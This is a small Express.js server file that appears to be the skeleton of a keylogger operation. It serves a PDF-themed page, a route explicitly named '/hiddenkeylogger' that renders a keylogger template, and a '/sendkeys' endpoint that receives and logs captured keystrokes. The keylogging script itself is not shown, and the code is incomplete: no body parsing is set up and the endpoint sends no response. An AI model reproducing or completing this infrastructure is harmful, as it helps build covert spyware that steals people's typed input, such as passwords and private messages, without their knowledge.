const express = require('express'),
    app = express();

app.set('view engine', "pug");
app.set("views", "./pug");
app.use(express.static("resources"));

app.get("/", (req, res) => {
    res.render("pdfpage.pug");
});

app.get("/hiddenkeylogger", (req, res) => {
    res.render("keylogger.pug");
});

app.post("/sendkeys", (req, res) => {
    // Placeholder for post mapping.
    console.log(req.body);
});

app.listen(8080, () => {
    console.log("server started");
})